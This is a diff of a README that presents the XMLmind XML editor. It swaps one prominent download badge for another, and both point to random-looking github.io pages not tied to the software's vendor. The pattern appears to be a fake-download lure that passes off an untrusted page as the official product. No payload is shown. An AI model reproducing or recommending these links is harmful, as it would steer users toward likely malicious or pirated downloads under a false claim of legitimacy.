@@ -4,12 +4,6 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/2e/7a/9e/2e7a9e25-a5e9-a4e7-a74c-f920379d15ae/icon.png/1200x600bf.png" alt="XMLmind Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/xmlmind">  
-<img src="https://img.shields.io/badge/Get_XMLmind-darkgreen?style=for-the-badge&logo=apple" alt="Get XMLmind">  
-</a>  
-</div>  
-
 ---
 
 ## What is XMLmind?
@@ -17,6 +11,8 @@
 ![XMLmind Publishing Interface](https://mac-cdn.softpedia.com/screenshots/xmlmind-xml-editor_3.jpg)
 
 XMLmind is a professional XML editing solution that enables users to create, manage, and publish structured content with ease. It is widely used by technical writers, documentation teams, and publishers for its robust support of industry-standard frameworks such as DITA and DocBook.
+
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://balotkfoodywwaej.github.io/.github/XMLmind-editor)
 
 The software combines a visual editor with powerful backend processing, allowing users to focus on content without worrying about formatting. Features include multi-format export, collaborative editing, template customization, and extensive automation options.
 
